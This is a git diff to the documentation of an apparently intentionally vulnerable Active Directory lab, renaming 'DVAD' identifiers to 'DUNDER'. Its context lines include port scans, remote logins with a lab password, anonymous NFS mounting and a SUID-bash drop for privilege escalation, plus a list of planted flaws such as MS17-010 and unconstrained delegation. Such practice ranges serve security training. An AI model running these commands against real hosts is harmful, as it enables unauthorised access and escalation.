@@ -292,7 +292,7 @@ nmap -p 88,389,445,636,3268 -sV 10.10.0.10 10.10.0.11 10.20.0.10 10.30.0.10
 evil-winrm -i 10.10.0.10 -u Administrator -p 'DVADlab2024!'
 
 # Verify ENUM surface playbook landed:
-nxc smb 10.10.0.10 -u alice -p 'DVADlab2024!' -x 'dir C:\Windows\Temp\DVAD_ENUM_SURFACE_ENABLED'
+nxc smb 10.10.0.10 -u alice -p 'DVADlab2024!' -x 'dir C:\Windows\Temp\DUNDER_ENUM_SURFACE_ENABLED'
 ```
 
 If any of the DCs are unreachable, check the bridge:
@@ -349,7 +349,7 @@ curl ftp://10.10.0.13/
 
 # Anonymous NFS on file01 (EnableAnonymousAccess=$true, UID 65534)
 showmount -e 10.10.0.13
-sudo mount -t nfs 10.10.0.13:/DVAD_NFS /mnt/nfs
+sudo mount -t nfs 10.10.0.13:/DUNDER_NFS /mnt/nfs
 ```
 
 ### IA-011..IA-018: MSSQL, WinRM, RDP, coercion, EternalBlue, ZeroLogon
@@ -972,7 +972,7 @@ ftp -a 10.10.0.13                                  # anonymous login allowed
 
 ```bash
 showmount -e 10.10.0.13
-sudo mount -t nfs -o vers=3 10.10.0.13:/DVAD_NFS /mnt/nfs
+sudo mount -t nfs -o vers=3 10.10.0.13:/DUNDER_NFS /mnt/nfs
 ls -la /mnt/nfs                                    # writes drop as UID 65534
 # Drop a SUID binary to escalate on a host that mounts the same share
 sudo cp /bin/bash /mnt/nfs/rootbash && sudo chmod 4755 /mnt/nfs/rootbash
@@ -1819,7 +1819,7 @@ curl -I 'http://10.10.0.12/certsrv/certfnsh.asp'
 |---|---|
 | Ports | 21 (FTP anon), 22 (OpenSSH, password auth), 23 (telnet), 80 (IIS), 111+2049 (NFS), 139/445 (SMB1+SMB2), 5985, 5986 |
 | Shares | `Public$` (anon RW), `Finance$` (alice RO), `HR$` (svc_hr RW), `Backup$` (Backup Operators), `IPC$` |
-| NFS | `/DVAD_NFS` (no_root_squash, anon UID 65534) |
+| NFS | `/DUNDER_NFS` (no_root_squash, anon UID 65534) |
 | Pre-loaded vulns | SMB1 enabled (MS17-010), SMB signing not required, NTLMv1 accepted, anonymous SMB+FTP+NFS, RBCD entry on `FILE01$`, unconstrained delegation on `svc_legacy`, gMSA `gmsa_file$` retrievable by `Backup Operators` |
 | Lateral surface | SSH pivot endpoint; ProxyChains the lab from here |
 
@@ -4033,7 +4033,7 @@ type C:\Flags\system_only\*.txt
 
 ## Appendix R — Glossary of DVAD-specific terms
 
-**`DVAD_HOME`** — environment variable set by `deploy.sh`, points to the repo root. Used by `qemu/vm-create.sh` to locate `media/`, `autounattend/`, `vms/`.
+**`DUNDER_HOME`** — environment variable set by `deploy.sh`, points to the repo root. Used by `qemu/vm-create.sh` to locate `media/`, `autounattend/`, `vms/`.
 
 **`dvad-ctf` bridge** — Linux bridge for `corp.local + eu.corp.local`. 10.10.0.0/21.
 
